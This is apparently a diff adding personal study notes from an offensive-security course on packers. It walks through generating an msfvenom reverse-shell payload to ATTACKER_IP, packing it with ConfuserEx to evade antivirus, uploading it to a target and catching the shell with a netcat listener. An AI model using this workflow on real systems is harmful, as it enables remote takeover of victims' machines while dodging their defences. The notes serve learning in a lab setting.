@@ -297,4 +297,30 @@ nc -lvp 443
 
 ----------------------------------------------------------------------------------------------------------------------------------------------------
 
+Packers
+-Packers: take a program as input and transform it to a different structure but with same functionality
+-compress the program
+-prevent reverse engineering
+-obfuscate malware
+
+-Packing an app
+-packing function -> transform -> unpacking function -> execute
+-unpacking function included by the packer
+
+C:\> msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=7478 -f csharp
+-insert in UnEncStagelessPayload.cs
+C:\> csc UnEncStagelessPayload.cs
+
+open confuserEx
+-programmed on .NET
+-add base directory
+-add output directory
+-setting enable packer to compressor
+-add rule edit to maximum
+-go to protect and protect
+
+-upload to anitvirus software
+-upload to target IP
+-get reverse shell
+nc -lvp 7478
 
